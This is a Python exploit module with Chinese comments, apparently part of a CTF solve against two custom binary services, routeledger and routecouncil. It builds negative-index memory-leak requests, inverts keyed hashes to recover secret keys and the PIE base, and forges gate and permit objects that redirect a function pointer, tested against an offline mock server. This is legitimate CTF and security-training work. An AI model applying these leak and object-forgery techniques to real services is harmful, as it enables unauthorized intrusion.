#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
12077 mosaic —— **L5 `routeledger` + L6 `routecouncil` 段**（独立模块，不改 `12077-solve.py`）
=========================================================================================

为什么单独一个文件
------------------
`scripts/12077-solve.py` 由 L1(worker) 段占用（本地已跑出 RELAY OK），它第 10 行已经把
L5/L6 指到 `work/12077_mosaic/layers/ledger_council.md`。本文件就是那份文档的可执行版，
按工作区规则「别改别人文件」，独立成 `scripts/12077-l5l6.py`，由 L1 脚本或主代理 import 调用。

用法
----
  python3 scripts/12077-l5l6.py --selftest     # 离线全量自测（不联网、不用靶机）
  python3 scripts/12077-l5l6.py --dump-cgate   # P1：CNCGATE5 的 +0x28 反解验收
  python3 scripts/12077-l5l6.py --target H:P --layer l6    # 真机（等主代理分配槽位）

验证状态（run 一次 --selftest 即见）
  ① hh 双射                                     ok
  ② L5: op 0x7f + 4×op 0x10(负下标) -> 13 字段 + PIE   ok（5 请求）
  ③ L5: op 0x11 解锁门（s220 由 LRANSCR5 反出）          ok
  ④ L6: op 0x7f + 4×op 0x10(sub=0xfc..0xff) -> 9 key + PIE  ok（5 请求）
  ⑤ L6: op 0x20 plan 门（32 qword 链 + permit 自指/函数指针） ok
  ⑥ L6: op 0x40 门 -> oracle 回包                       ok
  ⑥ 里把 gate 对象写进 .bss 的一步用 `mock.poke()` 顶替 —— 那是**唯一缺失的原语**。

Ghidra 的 C 有 4 处错，本文件全部按 objdump 复核（注释里标 `[asm]`）：
  1. `FUN_00102ab0` / `FUN_00102600` 的实参个数少报（4 个 / 1 个）；
  2. routecouncil 门最终 XOR 里 `rol(x,0xf)` 的操作数是 **f8**，不是 h1；
  3. L5 解锁第二个 hash 的域常量是 `"LUNLOCK5" - 0x100` = `0x354b434f4c4e544c`；
  4. L6 `op 0x7f` / `op 0x10` 回包长度都是 **0x20**（`r9d=0x20`），不是把整个 pair 表送出来。
"""

import argparse
import random
import socket
import struct
import sys

M = (1 << 64) - 1
K1C = (-0x40a7b892e31b1a47) & M
K2C = (-0x6b2fb644ecceee15) & M


# ────────────────────────────── 基础混合 ──────────────────────────────
def rol(x, n):
    n &= 63
    return ((x << n) | (x >> (64 - n))) & M if n else x & M


def ror(x, n):
    n &= 63
    return ((x >> n) | (x << (64 - n))) & M if n else x & M


def mix2(x):
    x = ((x >> 30) ^ x) * K1C & M
    return ((x >> 27) ^ x) * K2C & M


def hh(x):
    """一步 hash：mix2 再 ^(>>31)。**双射** —— 本文件所有反解都靠它。"""
    t = mix2(x)
    return t ^ (t >> 31)


def inv_xorshift(x, s):
    r, sh = x, s
    while sh < 64:
        r ^= r >> sh
        sh += s
    return r & M


_INV_K1 = pow(K1C, -1, 1 << 64)
_INV_K2 = pow(K2C, -1, 1 << 64)


def inv_mix2(y):
    t = inv_xorshift(y * _INV_K2 & M, 27)
    return inv_xorshift(t * _INV_K1 & M, 30)


def inv_hh(y):
    return inv_mix2(inv_xorshift(y, 31))


# ────────────────────────────── 两层 keyed hash ──────────────────────────────
def H8(dom, p2, p3, p4, p5, k):
    """routeledger FUN_00102ab0 —— **8 轮**；k = {'d0','d8','e0','e8'}。"""
    u1 = (k['d0'] ^ p2 ^ dom) & M
    u3 = (p3 ^ k['d8'] ^ 0x9e3779b97f4a7c15) & M
    u4 = (p5 ^ k['e8'] ^ 0x94d049bb133111eb) & M
    u2 = (p4 ^ k['e0'] ^ 0xd1b54a32d192ed03) & M
    u6 = dom & M
    for _ in range(8):
        u1 = (u1 + u3) & M
        u3 = rol(u3, 13) ^ u1
        u5 = rol(u4, 16) ^ ((u2 + u4) & M)      # [asm] `rol(u4,16) ^ (u2+u4)`，`+` 先算
        u2 = (u2 + u4 + u3) & M
        u1 = (u5 + rol(u1, 32)) & M
        u3 = rol(u3, 17) ^ u2
        u2 = rol(u2, 32)
        u4 = rol(u5, 21) ^ u1
        u5 = (u4 + u6) & M
        u6 = (u6 + 1) & M
        u5 = ((u5 >> 30) ^ u5) * K1C & M
        u5 = ((u5 >> 27) ^ u5) * K2C & M
        u1 = (u5 >> 31) ^ u1 ^ u5
    return hh((u3 ^ u4 ^ dom ^ u2 ^ u1) & M)


def H10(dom, p2, p3, p4, p5, k):
    """routecouncil FUN_00102600 —— **10 轮**；k = {'a0','a8','b0','b8'}。
    注意每步只乘一颗常数（K1 / K2 交错），不是 hh()。"""
    u4 = (p3 ^ k['a8'] ^ 0x243f6a8885a308d3) & M
    u3 = (p4 ^ k['b0'] ^ 0x13198a2e03707344) & M
    u6 = (p2 ^ k['a0'] ^ dom) & M
    u2 = (p5 ^ k['b8'] ^ 0xa4093822299f31d0) & M
    u7 = u8 = 0
    for _ in range(10):
        u6 = (u6 + rol(u4, 7)) & M
        u5 = (dom ^ u8 ^ u6) & M
        u7 = rol(u3, 19) ^ u4
        u4 = ror(u6, 21) ^ u2
        l1 = (rol(u2, 31) + u8) & M
        u6 = ((u5 >> 30) ^ u5) * K1C & M
        u8 = (u8 + 1) & M
        u2 = (l1 + u3 + u7) & M
        u2 = ((u2 >> 30) ^ u2) * K1C & M
        u6 = ((u6 >> 27) ^ u6) * K2C & M
        u3 = ((u2 >> 27) ^ u2) * K2C & M
        u6 ^= u6 >> 31
        u3 = (u3 >> 31) ^ u3
        u2 = u7
    return hh((dom ^ u7 ^ u4 ^ u6 ^ u3) & M)


# ────────────────────────────── 传输帧 ──────────────────────────────
# 请求 : u32 len | magic u32 | op u8 | sub u8 | aux u8 | 0 | u32 body_len | u32 seq | body
# 回包 : u32 n+0x10 | rmagic u32 | op u8 | a u8 | b u8 | 0 | u32 n | u32 seq | payload[n]
class Layer:
    def __init__(self, name, magic, reply_magic, maxlen=0x1810):
        self.name, self.magic, self.reply_magic, self.maxlen = name, magic, reply_magic, maxlen


L5 = Layer('routeledger', 0x3544474c, 0x3552474c)     # "LGD5" -> "LGR5"
L6 = Layer('routecouncil', 0x35434e52, 0x35524e52)    # "RNC5" -> "RNR5"


def frame(layer, op, body=b'', sub=0, aux=0, seq=1):
    n = 0x10 + len(body)
    assert 0x10 <= n <= layer.maxlen, f'len {n:#x} 越界'
    return (struct.pack('<I', n)
            + struct.pack('<IBBBB', layer.magic, op, sub, aux, 0)
            + struct.pack('<II', len(body), seq) + body)


class Reply:
    def __init__(self, raw):
        (self.total,) = struct.unpack_from('<I', raw, 0)
        self.magic, self.op, self.a, self.b, _z = struct.unpack_from('<IBBBB', raw, 4)
        self.n, self.seq = struct.unpack_from('<II', raw, 12)
        self.payload = raw[20:20 + self.n]

    def __repr__(self):
        return f'<Reply op={self.op:#04x} a={self.a:#04x} n={self.n:#x}>'


def recv_reply(sock):
    buf = b''
    while len(buf) < 4:
        c = sock.recv(4 - len(buf))
        if not c:
            raise EOFError('length')
        buf += c
    (total,) = struct.unpack_from('<I', buf, 0)          # = 16 + n，不含这 4 字节
    while len(buf) < 4 + total:
        c = sock.recv(4 + total - len(buf))
        if not c:
            raise EOFError('body')
        buf += c
    return Reply(buf)


class Conn:
    """一层一个连接；seq 必须严格递增（L5 op 0x10 还要求 seq & 0xf == 0，统一按 16 递增）。"""

    def __init__(self, layer, sock):
        self.layer, self.sock, self.seq = layer, sock, 0

    def xact(self, op, body=b'', sub=0, aux=0):
        self.seq += 0x10
        self.sock.sendall(frame(self.layer, op, body, sub, aux, self.seq))
        return recv_reply(self.sock)


# ══════════════════════════════════ L5 · routeledger ══════════════════════════════════
LG_MAGIC = {
    'LGNONCE5': 0x3545434e4f4e474c, 'LGEPOCH5': 0x3548434f5045474c,
    'LGKEY05':  0x353059454b4c474c, 'LGKEY15':  0x353159454b4c474c,
    'LGKEY25':  0x353259454b4c474c, 'LGKEY35':  0x353359454b4c474c,
    'LGSALT05': 0x3530544c4153474c, 'LGSALT15': 0x3531544c4153474c,
    'LGERMIT5': 0x3554494d5245474c, 'LGRELAY5': 0x3559414c4552474c,
    'LGLGPIE5': 0x35454950474c474c, 'LRANSCR5': 0x355243534e41524c,
}
LG_BYVAL = {v: k for k, v in LG_MAGIC.items()}
LG_MODV5 = 0x35564d444f4d474c        # table[i] = hh(c0 ^ i ^ 它)
LG_ADV = (0x21, 0x32, 0x43, 0x54)    # rodata[0x408a..]：sub 0..3 的「推进」码
L5_STATE = {'s200_4': None}


def lg_pairs(k):
    c0, c8, d0, d8 = k['c0'], k['c8'], k['d0'], k['d8']
    e0, e8, f0, f8 = k['e0'], k['e8'], k['f0'], k['f8']
    hk = {'d0': d0, 'd8': d8, 'e0': e0, 'e8': e8}
    pie = k.get('pie', 0)
    return {
        'LGNONCE5': c0 ^ hh(k['s200'] ^ LG_MAGIC['LGNONCE5']),
        'LGEPOCH5': c8 ^ hh(c0 ^ LG_MAGIC['LGEPOCH5']),
        'LGKEY05':  d0 ^ hh(c0 ^ c8 ^ LG_MAGIC['LGKEY05']),
        'LGKEY15':  d8 ^ hh(d0 ^ c0 ^ LG_MAGIC['LGKEY15']),
        'LGKEY25':  (e0 - hh((d8 + c8 + LG_MAGIC['LGKEY25']) & M)) & M,
        'LGKEY35':  e8 ^ rol(e0, 0x1b) ^ hh(c0 ^ LG_MAGIC['LGKEY35']),
        'LGSALT05': f0 ^ hh(d0 ^ LG_MAGIC['LGSALT05']),
        'LGSALT15': f8 ^ hh(e8 ^ LG_MAGIC['LGSALT15']),
        'LGERMIT5': H8(LG_MAGIC['LGERMIT5'], c0, c8, f0, 0, hk) ^ (pie + 0x6270),
        'LGRELAY5': H8(LG_MAGIC['LGRELAY5'], c8, c0, f8, 0, hk) ^ (pie + 0x6070),
        'LGLGPIE5': H8(LG_MAGIC['LGLGPIE5'], c0, c8, k['s208'], 0, hk) ^ (pie + 0x3140),
        'LRANSCR5': H8(LG_MAGIC['LRANSCR5'], f0, f8, c0, 0, hk) ^ k['s220'],
    }


def lg_vm_records(sub, base, count=6):
    """op 0x10 的 16 字节记录串：推进(base) -> (0x71,0x83) -> (0x94,0x71,0x83)×(count-1) -> 0xa6"""
    recs = [(LG_ADV[sub], base)]
    for i in range(count):
        if i:
            recs.append((0x94, 0))
        recs.append((0x71, 0))
        recs.append((0x83, 0))
    recs.append((0xa6, 0))
    out = bytearray()
    for i, (op, arg) in enumerate(recs):
        ck = (((op & 0xff) << 8) ^ (arg & 0xff) ^ ((i * 0x73) & 0xffff)
              ^ ((sub << 4) & 0xffff) ^ 0x5d39) & 0xffff
        out += struct.pack('<BBbBH H Q', op, sub, arg, 0, ck, 0, 0)
    return bytes(out)


def lg_vm_decode(sub, payload):
    """op 0x10 回包 0x30 字节 -> 该次读到的 6 个 qword（sk[0xc0+base*8 .. +5]）。"""
    out = struct.unpack('<6Q', payload)
    sk_sub = L5_STATE['s200_4'][sub]
    vals = []
    for idx in range(6):
        m = mix2(((sub & 0xff) << 32) | idx)
        vals.append(ror(out[idx], (sub * 9 + 7 + idx) & 0x3f) ^ (m >> 31) ^ sk_sub ^ m)
    return vals


def lg_leak_keys(conn):
    """P0-①：L5 的两条泄漏原语 → 全部 13 个字段 + PIE 基址（5 个请求）。"""
    r = conn.xact(0x7F)                                   # op 0x7f, len=0
    assert r.op == 0x70, r
    v = struct.unpack('<6Q', r.payload)
    assert len(r.payload) == 0x30 and v[4] == LG_MODV5 and v[5] == 5, 'op 0x7f 回包形状不对'
    s200, s208, s210, s218 = v[0], v[1], v[2], v[3]
    L5_STATE['s200_4'] = [s200, s208, s210, s218]

    # 4× op 0x10：base = -24,-18,-12,-6 ⇒ 覆盖 sk+0x00..sk+0xbf（12 组 pair 的 24 qword）
    q = {}
    for sub, base in enumerate((-24, -18, -12, -6)):
        r = conn.xact(0x10, lg_vm_records(sub, base), sub=sub)
        assert r.op == 0x80, f'op 0x10 sub={sub} -> {r.op:#x}（期望 0x80）'
        assert len(r.payload) == 0x30
        for j, val in enumerate(lg_vm_decode(sub, r.payload)):
            q[base + j] = val
    tbl = {}
    for slot in range(12):
        name = LG_BYVAL.get(q[-24 + 2 * slot])
        assert name, f'pair slot {slot} magic {q[-24 + 2*slot]:#x} 不认识'
        tbl[name] = q[-24 + 2 * slot + 1]
    assert len(tbl) == 12

    # 反解（顺序有依赖：每一步的 hh() 都用已解出的 key）
    c0 = tbl['LGNONCE5'] ^ hh(s200 ^ LG_MAGIC['LGNONCE5'])
    c8 = tbl['LGEPOCH5'] ^ hh(c0 ^ LG_MAGIC['LGEPOCH5'])
    d0 = tbl['LGKEY05'] ^ hh(c0 ^ c8 ^ LG_MAGIC['LGKEY05'])
    d8 = tbl['LGKEY15'] ^ hh(d0 ^ c0 ^ LG_MAGIC['LGKEY15'])
    e0 = (tbl['LGKEY25'] + hh((d8 + c8 + LG_MAGIC['LGKEY25']) & M)) & M
    e8 = tbl['LGKEY35'] ^ rol(e0, 0x1b) ^ hh(c0 ^ LG_MAGIC['LGKEY35'])
    f0 = tbl['LGSALT05'] ^ hh(d0 ^ LG_MAGIC['LGSALT05'])
    f8 = tbl['LGSALT15'] ^ hh(e8 ^ LG_MAGIC['LGSALT15'])
    hk = {'d0': d0, 'd8': d8, 'e0': e0, 'e8': e8}
    # ★ s220 的唯一出处：LRANSCR5（op 0x11 解锁要用，别处拿不到）
    s220 = tbl['LRANSCR5'] ^ H8(LG_MAGIC['LRANSCR5'], f0, f8, c0, 0, hk)
    sk = dict(c0=c0, c8=c8, d0=d0, d8=d8, e0=e0, e8=e8, f0=f0, f8=f8,
              s200=s200, s208=s208, s210=s210, s218=s218, s220=s220)
    sk['pie'] = (tbl['LGERMIT5'] ^ H8(LG_MAGIC['LGERMIT5'], c0, c8, f0, 0, hk)) - 0x6270
    sk['_pairs'] = tbl
    return sk


def lg_unlock_body(sk):
    """op 0x11 的 16 字节 body（两个 H8 的实参都按 objdump 复核）。"""
    hk = {'d0': sk['d0'], 'd8': sk['d8'], 'e0': sk['e0'], 'e8': sk['e8']}
    v1 = H8(0x354b434f4c4e554c, sk['c0'], sk['c8'], sk['s220'], sk['f0'], hk)  # "LUNLOCK5"
    v2 = H8(0x354b434f4c4e544c, v1, sk['f8'], sk['s200'], sk['s218'], hk)      # -=0x100
    return struct.pack('<QQ', v1, v2)


# ══════════════════════════════════ L6 · routecouncil ══════════════════════════════════
CC_MAGIC = {
    'CCNONCE5': 0x3545434e4f4e4343, 'CCTICKT5': 0x35544b4349544343,
    'CNCKEY05': 0x353059454b434e43, 'CNCKEY15': 0x353159454b434e43,
    'CNCKEY25': 0x353259454b434e43, 'CNCKEY35': 0x353359454b434e43,
    'CNCALT05': 0x3530544c41434e43, 'CNCALT15': 0x3531544c41434e43,
}
CC_BYVAL = {v: k for k, v in CC_MAGIC.items()}
CC_PLAN_MAGIC = 0x354e414c50434e43   # "CNCPLAN5"
CC_GATE_MAGIC = 0x3545544147434e43   # "CNCGATE5"
CC_PMT_MAGIC = 0x35544d5250434e43    # "CNCPRMT5"
CC_ORACLE_OFF = 0x2C90               # FUN_00102c90（唯一调用点 = op 0x40 门后 0x1f34）
CC_GATE_OFF = 0x50D0
CC_PLAN_OFF = 0x5260
CC_PMT_OFF = 0x5360                  # = CC_PLAN_OFF + 0x100（plan 缓冲后半段，不受链约束）
L6_STATE = {'k78': 0}


def cc_pairs(k):
    K1, K2, a0, a8 = k['K1'], k['K2'], k['a0'], k['a8']
    b0, b8 = k['b0'], k['b8']
    hk = {'a0': a0, 'a8': a8, 'b0': b0, 'b8': b8}
    return {
        'CCNONCE5': hh(k['k78'] ^ CC_MAGIC['CCNONCE5']) ^ K1,
        'CCTICKT5': hh(K1 ^ CC_MAGIC['CCTICKT5']) ^ K2,
        'CNCKEY05': hh(K1 ^ K2 ^ CC_MAGIC['CNCKEY05']) ^ a0,
        'CNCKEY15': hh(K1 ^ a0 ^ CC_MAGIC['CNCKEY15']) ^ a8,
        'CNCKEY25': (b0 - hh((a8 + K2 + CC_MAGIC['CNCKEY25']) & M)) & M,
        'CNCKEY35': b8 ^ rol(b0, 0x19) ^ hh(K1 ^ CC_MAGIC['CNCKEY35']),
        'CNCALT05': H10(CC_MAGIC['CNCALT05'], K1, K2, a0, 0, hk) ^ k['alt0'],
        'CNCALT15': H10(CC_MAGIC['CNCALT15'], K2, K1, b8, 0, hk) ^ k['alt1'],
    }


def cc_decode_leak10(cnt, payload):
    """op 0x10 回包 0x20 字节 -> DAT_00105460 的 4 个 qword。
    下标 = (signed char)(cnt-4)*4 + idx + 0x10，cnt = 调用前的 DAT_00105074。"""
    out = struct.unpack('<4Q', payload)
    k78 = L6_STATE['k78']
    vals = []
    for idx in range(4):
        m = mix2(((cnt & 0xff) << 32) | idx)
        vals.append(ror(out[idx], (cnt * 11 + 5 + idx) & 0x3f) ^ (m >> 31) ^ k78 ^ m)
    return vals


def cc_leak_keys(conn):
    """P0-③：L6 的 signed-char 负下标泄漏 → 9 个 key + PIE 基址（5 个请求）。"""
    r = conn.xact(0x7F)
    assert r.op == 0x70, r
    v = struct.unpack('<4Q', r.payload)
    assert len(r.payload) == 0x20 and v[3] == CC_PLAN_MAGIC, 'op 0x7f 回包形状不对'
    h_s, h_c = v[1], v[2]
    L6_STATE['k78'] = v[0]

    q = {}
    for cnt in range(4):
        sub = (cnt - 4) & 0xff          # 0xfc,0xfd,0xfe,0xff：靠 (char)(cnt-4) 比较通过
        r = conn.xact(0x10, b'', sub=sub)
        assert r.op == 0x80, f'op 0x10 sub={sub:#x} -> {r.op:#x}（期望 0x80）'
        assert len(r.payload) == 0x20
        for j, val in enumerate(cc_decode_leak10(cnt, r.payload)):
            q[cnt * 4 + j] = val
    tbl = {}
    for slot in range(8):
        name = CC_BYVAL.get(q[2 * slot])
        assert name, f'pair slot {slot} magic {q[2*slot]:#x} 不认识'
        tbl[name] = q[2 * slot + 1]

    K1 = tbl['CCNONCE5'] ^ hh(v[0] ^ CC_MAGIC['CCNONCE5'])
    K2 = tbl['CCTICKT5'] ^ hh(K1 ^ CC_MAGIC['CCTICKT5'])
    a0 = tbl['CNCKEY05'] ^ hh(K1 ^ K2 ^ CC_MAGIC['CNCKEY05'])
    a8 = tbl['CNCKEY15'] ^ hh(K1 ^ a0 ^ CC_MAGIC['CNCKEY15'])
    b0 = (tbl['CNCKEY25'] + hh((a8 + K2 + CC_MAGIC['CNCKEY25']) & M)) & M
    b8 = tbl['CNCKEY35'] ^ rol(b0, 0x19) ^ hh(K1 ^ CC_MAGIC['CNCKEY35'])
    hk = {'a0': a0, 'a8': a8, 'b0': b0, 'b8': b8}
    alt0 = tbl['CNCALT05'] ^ H10(CC_MAGIC['CNCALT05'], K1, K2, a0, 0, hk)
    alt1 = tbl['CNCALT15'] ^ H10(CC_MAGIC['CNCALT15'], K2, K1, b8, 0, hk)
    k = dict(k78=v[0], K1=K1, K2=K2, a0=a0, a8=a8, b0=b0, b8=b8, alt0=alt0, alt1=alt1)
    # PIE：0x7f 回包里两个 hash 各 xor 一个绝对地址（两个独立估计，互相校验）
    k['pie_a'] = (h_s ^ H10(0x35454c4341524f53, K1, K2, v[0], 0, hk)) - 0x2740
    k['pie_b'] = (h_c ^ H10(0x35454c4341524f63, K2, K1, v[0], 0, hk)) - 0x50D0
    k['_pairs'] = tbl
    return k


def cc_plan_chain(k, hk):
    """op 0x20 那 0x200 字节里，前 0x100（32 qword）必须满足的 keyed 链。"""
    return [H10((i ^ CC_PLAN_MAGIC) & M, k['K1'], k['K2'],
                (k['alt0'], k['alt1'])[i & 1], i, hk) for i in range(0x20)]


def cc_permit_object(k, hk, pie):
    """permit 对象（`.bss 0x5360`）：住在 op 0x20 那 0x200 字节的**后半段**，不受链约束。"""
    P = bytearray(0x100)

    def put(o, val):
        P[o:o + 8] = (val & M).to_bytes(8, 'little')

    chain = k['_chain']
    u = (k['K1'] ^ k['K2'] ^ CC_PLAN_MAGIC) & M
    b = 3
    for i in range(0x20):
        u = hh((rol(chain[i], b & 0x3f) ^ i ^ u) & M)
        b += 7
    put(0x00, CC_PMT_MAGIC)
    put(0x08, k['K1'])
    put(0x10, k['K2'])
    put(0x18, pie + CC_PMT_OFF)        # 自指
    put(0x20, pie + CC_GATE_OFF)       # &gate
    put(0x28, pie + 0x2740)            # &FUN_00102740 ←「某 qword == 函数地址」
    put(0x30, u)                       # 32 轮链结果
    h0 = H10(0x35544d5250434e53, k['K1'], k['K2'], pie + CC_PMT_OFF, pie + CC_GATE_OFF, hk)
    put(0x38, h0)
    h1 = H10(0x35544d5250434e63, pie + 0x2740, u, k['alt0'], k['alt1'], hk)
    put(0x40, h1)
    h2 = H10(0x35544d5250434e73, h0, h1, pie + CC_PMT_OFF, k['k78'], hk)
    put(0x48, h2)
    h3 = H10(0x35544d5250434e03, h1, h2, pie + CC_GATE_OFF, k['K2'], hk)
    put(0x50, h3)
    put(0x58, (u ^ h0 ^ rol(h1, 9) ^ rol(h2, 0x1b) ^ ror(h3, 0x13)) & M)
    put(0x60, 1)
    return bytes(P)


def cc_plan_body(k, hk, pie):
    """op 0x20 的 0x400 字节 RLE body：0x200 个 (1, byte) 对 ⇒ 展开正好 0x200 字节。"""
    chain = cc_plan_chain(k, hk)
    k['_chain'] = chain
    pmt = cc_permit_object(k, hk, pie)
    plan = b''.join(val.to_bytes(8, 'little') for val in chain) + pmt
    assert len(plan) == 0x200
    body = bytearray()
    for ch in plan:
        body += bytes((1, ch))
    assert len(body) == 0x400
    return bytes(body), pmt


def cc_gate_object(k, hk, pie, pmt):
    """P1：`CNCGATE5` @pie+0x50d0，其中 +0x28 就是「必须解出 &FUN_00102c90」的一环。

    [asm 0x1db1..0x1de7]
        b0 ^ K2 ^ (pie+0x50d0) ^ ror(f8 - a0, 23) == pie+0x2c90
    ⇒   f8 = rol( (pie+0x2c90) ^ b0 ^ K2 ^ (pie+0x50d0), 23 ) + a0
       （= 作者那个 FUN_00102d40(p)=rol(b0^c0^0x1050d0^p,23)+a0 的逆用）
    """
    pq = struct.unpack('<32Q', pmt)
    G = bytearray(0x60)

    def put(o, val):
        G[o:o + 8] = (val & M).to_bytes(8, 'little')

    oracle = pie + CC_ORACLE_OFF
    f8 = (rol(oracle ^ k['b0'] ^ k['K2'] ^ (pie + CC_GATE_OFF), 23) + k['a0']) & M
    put(0x00, CC_GATE_MAGIC)
    put(0x08, k['K1'])
    put(0x10, k['K2'])
    put(0x18, pie + CC_PMT_OFF)
    put(0x20, pq[0x58 // 8])           # = [0x53b8]
    put(0x28, f8)
    h0 = H10(0x3545544147434e53, k['K1'], k['K2'], pie + CC_PMT_OFF, pq[0x58 // 8], hk)
    put(0x30, h0)
    h1 = H10(0x3545544147434e63, f8, pie + CC_GATE_OFF, k['alt0'], k['alt1'], hk)
    put(0x38, h1)
    h2 = H10(0x3545544147434e73, h0, h1, pq[0x48 // 8], pq[0x50 // 8], hk)
    put(0x40, h2)
    h3 = H10(0x3545544147434e03, h1, h2, k['k78'], k['K2'], hk)
    put(0x48, h3)
    # [asm 0x1ef0..0x1f24]  b8 ^ h0 ^ rol(**f8**,15) ^ ror(h2,31) ^ ror(h3,13) == [0x5120]
    put(0x50, (pq[0x58 // 8] ^ h0 ^ rol(f8, 15) ^ ror(h2, 31) ^ ror(h3, 13)) & M)
    put(0x58, 1)
    return bytes(G), f8


# ══════════════════════════════════ 离线 mock server ══════════════════════════════════
class MockBase:
    def __init__(self):
        self.last_seq = 0
        self.mem = bytearray(0x6000)      # 模拟 .bss：偏移 = PIE 相对地址（plan 到 0x5460）

    def poke(self, off, data):
        """★ 显式顶替「缺失的任意写原语」：真机要先把 malloc 骗到 .bss。"""
        self.mem[off:off + len(data)] = data

    def rd(self, off):
        return struct.unpack_from('<Q', self.mem, off)[0]

    def wr(self, off, val):
        struct.pack_into('<Q', self.mem, off, val & M)

    def parse(self, raw, layer):
        (total,) = struct.unpack_from('<I', raw, 0)
        magic, op, sub, aux, _z = struct.unpack_from('<IBBBB', raw, 4)
        blen, seq = struct.unpack_from('<II', raw, 12)
        assert magic == layer.magic and blen == total - 0x10 and seq > self.last_seq
        self.last_seq = seq
        return op, sub, aux, seq, raw[20:4 + total]      # 长度前缀不含自身 4 字节

    def reply(self, layer, op, a, b, seq, payload=b''):
        return (struct.pack('<I', 0x10 + len(payload))
                + struct.pack('<IBBBB', layer.reply_magic, op, a, b, 0)
                + struct.pack('<II', len(payload), seq) + payload)


class LGServer(MockBase):
    """routeledger 镜像：op 0x7f / 0x10（含 phase1 全部门）/ 0x11。"""

    def __init__(self, pie=0x555555554000, seed=None):
        super().__init__()
        rnd = random.Random(seed)
        R = lambda: rnd.getrandbits(64)      # noqa: E731
        self.k = dict(c0=R(), c8=R(), d0=R(), d8=R(), e0=R(), e8=R(), f0=R(), f8=R(),
                      s200=R(), s208=R(), s210=R(), s218=R(), s220=R())
        self.pie = pie
        self.sk = lg_pairs(dict(self.k, pie=pie))   # LGERMIT5/RELAY/LGPIE 里 xor 的是绝对地址
        names = list(LG_MAGIC)
        rnd.shuffle(names)
        self.pair_order = names
        for i, n in enumerate(names):        # FUN_00103140：洗牌后落盘
            self.wr(16 * i, LG_MAGIC[n])
            self.wr(16 * i + 8, self.sk[n])
        for i in range(0x20):                # +0xc0 起 32 项表
            self.wr(0xC0 + 8 * i, hh(self.k['c0'] ^ i ^ LG_MODV5))
        for o, f in ((0x1C0, 'c0'), (0x1C8, 'c8'), (0x1F0, 'f0'), (0x1F8, 'f8'), (0x220, 's220')):
            self.wr(o, self.k[f])
        for i, f in enumerate(('d0', 'd8', 'e0', 'e8')):
            self.wr(0x1D0 + 8 * i, self.k[f])
        for i, f in enumerate(('s200', 's208', 's210', 's218')):
            self.wr(0x200 + 8 * i, self.k[f])
        self.usedmask = 0
        self.unlocked = 0

    def handle(self, raw, layer=L5):
        op, sub, aux, seq, body = self.parse(raw, layer)
        blen = len(body)
        if op == 0x7F and blen == 0:                     # 0x1b5a
            return self.reply(layer, 0x70, sub, aux, seq, struct.pack(
                '<6Q', self.rd(0x200), self.rd(0x208), self.rd(0x210), self.rd(0x218),
                LG_MODV5, 5))
        if op == 0x10:
            if sub >= 4 or (self.usedmask >> sub) & 1 or not 1 <= blen <= 0x20F or blen & 0xF:
                return self.reply(layer, 0xE1, sub, aux, seq)
            try:
                out = self._vm(sub, blen, body)
            except AssertionError:
                return self.reply(layer, 0xE1, sub, aux, seq)
            self.usedmask |= 1 << sub
            return self.reply(layer, 0x80, sub, aux, seq, out)
        if op == 0x11:
            if blen != 0x10 or self.usedmask != 0xF or self.unlocked:
                return self.reply(layer, 0xE1, sub, aux, seq)
            if body == lg_unlock_body(dict(self.k)):
                self.unlocked = 1
                return self.reply(layer, 0x81, sub, aux, seq)
            return self.reply(layer, 0xE1, sub, aux, seq)
        return self.reply(layer, 0xE1, sub, aux, seq)

    def _vm(self, sub, blen, body):
        """phase1（0x163c..0x1690）+ phase2。"""
        n = blen >> 4
        recs = [struct.unpack_from('<BBbBH H Q', body, 16 * i) for i in range(n)]
        i7, b19, b20, c83 = 0, False, False, 0
        for i, (op, s1, arg, z3, ck, z6, z8) in enumerate(recs):
            assert s1 == sub and z3 == 0 and z6 == 0 and z8 == 0 and not b20
            assert ck == (((op << 8) ^ (arg & 0xff) ^ (i * 0x73) ^ (sub << 4) ^ 0x5d39) & 0xFFFF)
            if op != LG_ADV[sub]:
                if op == 0x71:
                    assert b19 and i7 < 0x20
                    b20, b19 = False, True
                elif op == 0x83:
                    c83 += 1
                    assert c83 < 7
                elif op == 0x94:
                    i7 += 1
                    assert i7 < 0x20
                elif op == 0xA6:
                    b20 = True
                else:
                    raise AssertionError('bad opcode')
            else:
                assert not b19, '「推进」只能出现一次'
                i7 += arg
                if sub == 0:
                    assert ((i7 + 0x20) & 0xFF) <= 0x3F
                elif sub == 1:
                    assert ((i7 + 0x20) & 0xFFFF) <= 0x3F
                elif sub == 2:
                    assert ((i7 & 0xFF) ^ 0x80) - 0x80 <= 0x1F      # (char)i7 <= 0x1f
                else:
                    assert (i7 + 0x20) <= 0x3F
                b20, b19 = False, True
        assert b20 and b19 and c83 == 6, (b20, b19, c83)
        i7, idx, u23 = 0, 0, 0
        outp = [0] * 6
        sk_sub = self.rd(0x200 + 8 * sub)
        for (op, s1, arg, z3, ck, z6, z8) in recs:
            if op == LG_ADV[sub]:
                i7 += arg
            elif op == 0x71:
                u23 = self.rd(0xC0 + i7 * 8)          # 带符号下标 ⇒ 可读 sk+0x00..0x1b8
            elif op == 0x83:
                m = mix2(((sub & 0xFF) << 32) | idx)
                outp[idx] = rol(((m >> 31) ^ sk_sub ^ u23 ^ m) & M,
                                (sub * 9 + 7 + idx) & 0x3F)
                idx += 1
            elif op == 0x94:
                i7 += 1
            elif op == 0xA6:
                break
        return struct.pack('<6Q', *outp)


class CCServer(MockBase):
    """routecouncil 镜像：op 0x7f / 0x10 / 0x20(plan 门) / 0x40(oracle 门)。"""
    FAKE_FLAG = b'DASCTF{offline_mock_L6_oracle_ok}\n'

    CALLOC = 0x800        # DAT_00105460 是 calloc(1,0x100) 出来的**堆**块，和 .bss 分开建模

    def __init__(self, pie=0x555555554000, seed=None):
        super().__init__()
        rnd = random.Random(seed)
        R = lambda: rnd.getrandbits(64)      # noqa: E731
        self.k = dict(k78=R(), K1=R(), K2=R(), a0=R(), a8=R(), b0=R(), b8=R(),
                      alt0=R(), alt1=R())
        self.pie = pie
        self.sk = cc_pairs(self.k)
        names = list(CC_MAGIC)
        rnd.shuffle(names)
        self.pair_order = names
        for i, n in enumerate(names):
            self.wr(self.CALLOC + 16 * i, CC_MAGIC[n])
            self.wr(self.CALLOC + 16 * i + 8, self.sk[n])
        for i in range(4):                    # +0x80 起 4x4 的 CORACLE5 表
            for j in range(4):
                self.wr(self.CALLOC + 0x80 + 0x20 * i + 8 * j,
                        hh(self.k['k78'] ^ j ^ i ^ 0x35454c4341524f45))
        self.wr(0x78, self.k['k78'])
